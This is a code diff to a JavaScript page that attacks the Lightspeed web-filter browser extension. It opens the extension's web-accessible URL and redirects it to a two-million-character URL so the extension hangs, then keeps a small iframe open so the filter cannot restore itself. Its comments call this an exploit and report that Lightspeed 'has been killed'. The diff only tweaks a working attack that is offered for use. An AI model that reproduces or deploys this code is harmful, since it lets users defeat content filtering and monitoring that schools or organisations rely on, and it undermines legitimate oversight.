@@ -139,30 +139,22 @@
     	    document.body.appendChild(overlay);
 
     	    let extURL = "chrome-extension://adkcpkpghahmbopkjchobieckeoaoeem/icon-128.png";
-    	    let extFrame = document.createElement("iframe");
-    	    extFrame.src = extURL;
-    	    document.body.appendChild(extFrame);
+    	    let extWin = window.open(extURL);
     
-    	    setTimeout(function () { // Exploit function which creates an iframe pointing to lightspeed's web accessible url and then redirects it to a 2 million digit long URI
-        	let killURL = "https://" + "e".repeat(2000000);
-        	extFrame.src = killURL;
-        	setTimeout(function () {
-            	    document.body.removeChild(extFrame);
-            	    let extFrame2 = document.createElement("iframe");
-            	    extFrame2.src = extURL;
-            	    document.body.appendChild(extFrame2);
-            	    setTimeout(function () {
-               	        extFrame2.src = killURL;
-                	setTimeout(function () {
-                    	    document.body.removeChild(extFrame2);
-                    	    document.body.removeChild(overlay);
-                    	    let persistFrame = document.createElement("iframe"); // Persist iframe so lighspeed wont restore itself when the switch is flipped
-                    	    persistFrame.src = extURL;
-                    	    document.body.appendChild(persistFrame);
-                    	    createPopup();
-                	}, 1000);
-            	    }, 250);
-        	}, 1000);
+    	    setTimeout(function () { // Exploit function which opens a window pointing to lightspeed's web accessible url and then redirects it to a 2 million digit long URI
+                let killURL = "https://" + "e".repeat(2000000); // generates a really long URL that hangs the extension page
+                extWin.location.href = killURL;
+                let iframe = document.createElement("iframe"); // iframe so that lightspeed wont restore itself when the switch is flipped
+                iframe.src = extURL;
+            	iframe.style.width = "10px";
+            	iframe.style.height = "10px";
+            	iframe.style.border = "none";
+            	document.body.appendChild(iframe);
+                setTimeout(function() {
+		    extWin.close()
+		    document.body.removeChild(overlay);
+		    createPopup()
+            	}, 500);
     	    }, 250);
 	}
 
@@ -253,7 +245,7 @@
         	iframe.style.position = "absolute";
         	iframe.style.left = "-9999px"; 
         	iframe.onload = () => {
-        	    if (Date.now() - timeOfPopupCreation < 1500) {
+        	    if (Date.now() - timeOfPopupCreation < 2000) {
             		instructions.innerHTML = "Lightspeed failed to be hanged...";
         	    } else {
             		instructions.innerHTML = "Lightspeed has been killed! You can close this tab now.";
